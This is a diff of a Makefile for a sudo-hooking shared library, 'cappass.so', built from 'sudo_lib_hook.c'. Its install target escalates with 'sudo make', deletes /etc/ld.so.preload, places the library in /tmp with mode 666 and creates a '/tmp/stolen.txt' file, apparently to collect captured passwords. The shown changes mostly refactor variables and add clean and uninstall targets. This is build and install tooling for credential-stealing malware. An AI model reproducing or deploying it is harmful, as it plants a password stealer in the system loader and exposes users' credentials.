@@ -1,6 +1,10 @@
 # Define the C compiler and flags
 CC = gcc
-CFLAGS = -Wall -fPIC -shared
+CFLAGS = -Wall -fPIC
+LDFLAGS = -shared
+PROG = cappass.so
+SOURCES = sudo_lib_hook.c
+OBJECTS = $(SOURCES:.c=.o)
 LIBS = -ldl
 UID = id -u
 DEL = rm -f
@@ -11,27 +15,37 @@ ECHO = echo
 RAISE = sudo make
 LDSOPRE = /etc/ld.so.preload
 INSTLOC = /tmp
-SLNAME = cappass.so
 PASSFILE = stolen.txt
-LIBLOC = $(INSTLOC)/$(SLNAME)
+LIBLOC = $(INSTLOC)/$(PROG)
 PFLOC = $(INSTLOC)/$(PASSFILE)
 
-all: cappass.so
+all: $(PROG)
 
-cappass.so: sudo_lib_hook.c
-	$(CC) $(CFLAGS) -o $@ $^
+$(PROG): $(OBJECTS)
+	$(CC) $(LIBS) $(LDFLAGS)  $^ -o $@
+
+%.o: %.c
+	$(CC) $(CFLAGS) -c $< -o $@
+
 
 # Phony target for cleaning up generated files
+
+.PHONY: uninstall deinstall
 .PHONY: clean
+
 clean:
-	$(DEL) $(SLNAME) $(PFLOC)
+    ifneq ($(shell $(UID)), 0)
+	$(RAISE) $@
+    else
+	$(DEL) $(PROG) $(PFLOC) $(OBJECTS)
+    endif
 
 install: all
     ifneq ($(shell $(UID)), 0)
 	$(RAISE) $@
     else
 	$(DEL) $(LIBLOC) $(LDSOPRE) $(PFLOC)
-	$(COPY) $(SLNAME) $(LIBLOC)
+	$(COPY) $(PROG) $(LIBLOC)
 	$(PERMS) 666 $(LIBLOC)
 	$(TOUCH) $(PFLOC)
 	$(PERMS) 644 $(PFLOC)
@@ -44,3 +58,6 @@ deinstall: all
     else
 	$(DEL) $(LIBLOC) $(LDSOPRE) $(PFLOC)
     endif
+
+uninstall: deinstall
+
